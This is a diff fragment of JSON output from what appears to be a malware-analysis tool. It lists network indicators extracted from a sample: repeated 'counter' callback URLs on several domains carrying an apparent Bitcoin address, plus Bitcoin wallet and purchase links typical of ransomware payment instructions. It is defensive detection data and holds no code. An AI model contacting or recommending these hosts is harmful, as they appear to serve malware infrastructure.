+          "value": "http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=02"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=03"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=04"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://projectdare.co.uk/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=05"
+        }
+      ],
+      "network.dynamic.uri_path": [
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=01"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=02"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=03"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=04"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/counter/?ad=1PdN3rw5BbYzjH4bs9J7gNBbDHLHiKhYCs&id=LZYF9ZMqgF5p5vYBCNUZ47q4APPUucn_m_WTT2wUeNdf5uH-w9ppNfDwmv54EB1VkJxJmO4iQA&rnd=05"
+        }
+      ],
+      "network.static.domain": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "blockchain.info"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "hotel.internetdsl.pl"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "localbitcoins.com"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "projectdare.co.uk"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "tintssori.com.mialias.net"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "tt-metall.ru"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "www.wordbaasoverdebal.nl"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://hotel.internetdsl.pl/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://projectdare.co.uk/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=01"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=02"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=03"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=04"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://projectdare.co.uk/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=05"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://tintssori.com.mialias.net/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://tt-metall.ru/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "http://www.wordbaasoverdebal.nl/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://blockchain.info/wallet/new"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://localbitcoins.com/buy_bitcoins"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/buy_bitcoins"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/counter/?a=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=01"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=02"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=03"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=04"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/counter/?ad=1pdn3rw5bbyzjh4bs9j7gnbbdhlhikhycs&id=lzyf9zmqgf5p5vybcnuz47q4appuucn_m_wtt2wuendf5uh-w9ppnfdwmv54eb1vkjxjmo4iqa&rnd=05"
+        },
+        {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "/wallet/new"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
+}
